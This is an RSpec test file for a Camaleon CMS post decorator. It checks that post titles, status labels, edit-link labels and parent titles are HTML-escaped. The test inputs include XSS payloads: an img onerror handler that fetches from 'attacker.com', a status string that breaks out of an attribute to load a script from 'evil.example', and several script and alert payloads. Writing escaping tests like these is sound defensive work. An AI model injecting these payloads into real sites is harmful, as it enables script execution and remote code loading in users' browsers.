# frozen_string_literal: true

RSpec.describe CamaleonCms::PostDecorator do
  let(:post) { create(:post, title: title) }
  let(:decorator) { post.decorate }

  describe '#the_title - XSS prevention' do
    let(:title) { 'Test Post' }

    it 'escapes HTML in post titles' do
      post.title = '<img src=x onerror=fetch(attacker.com)>'
      expect(decorator.the_title).to include('&lt;img')
    end

    it 'renders safe titles normally' do
      post.title = 'Safe Title'
      expect(decorator.the_title).to eq('Safe Title')
    end

    it 'escapes script tags' do
      post.title = '<script>alert(1)</script>'
      expect(decorator.the_title).not_to include('<script>')
      expect(decorator.the_title).to include('&lt;script&gt;')
    end
  end

  # The label reaches three admin sinks through `raw`, and downstream themes -- most of which live in
  # separate gems this repo cannot see -- have had years to match on its exact bytes. Escaping the
  # interpolated value must therefore leave a legitimate status byte-identical.
  describe '#the_status' do
    let(:title) { 'Test Post' }

    {
      'published' => "<span class='label label-info label-form'>Published</span>",
      'pending' => "<span class='label label-default label-form'>Pending</span>",
      'draft' => "<span class='label label-warning label-form'>Draft</span>",
      'draft_child' => "<span class='label label-warning label-form'>Draft</span>",
      'trash' => "<span class='label label-danger label-form'>Trash</span>"
    }.each do |status, expected|
      it "renders the #{status} status exactly as before" do
        post.status = status

        expect(decorator.the_status).to eq(expected)
      end
    end

    it 'returns a SafeBuffer, so the value survives an escaping sink as well as a raw one' do
      post.status = 'published'

      expect(decorator.the_status).to be_a(ActiveSupport::SafeBuffer)
    end

    # `titleize` only changes case, and both HTML tag names and hostnames are case-insensitive.
    it 'escapes a status that is not canonical' do
      post.status = "x'><script src=//evil.example/a.js></script>"

      output = decorator.the_status

      expect(output).not_to include('<script')
      expect(output).to include('&lt;Script Src=//Evil.Example/A.Js&gt;')
    end
  end

  describe '#the_edit_link' do
    let(:title) { 'Editable Post' }

    it 'escapes the link label' do
      allow(decorator.h).to receive(:cama_current_user).and_return(instance_double(CamaleonCms::User))
      allow(decorator).to receive(:the_edit_url).and_return('/admin/posts/1/edit')

      output = decorator.the_edit_link('<script>alert(1)</script>')

      expect(output).to include('&lt;script&gt;alert(1)&lt;/script&gt;')
      expect(output).not_to include('<script>')
    end
  end

  describe '#the_hierarchy_title' do
    let(:title) { '<img src=x onerror=alert(1)>' }
    let(:parent_post) { create(:post, site: post.post_type.site, title: '<script>alert(1)</script>') }

    it 'escapes both child and parent titles' do
      post.update!(post_parent: parent_post.id)
      post.show_title_with_parent = true

      output = decorator.the_hierarchy_title

      expect(output).to include('&lt;img')
      expect(output).to include('&lt;script&gt;alert(1)&lt;/script&gt;')
      expect(output).not_to include('<img')
      expect(output).not_to include('<script>')
    end
  end
end
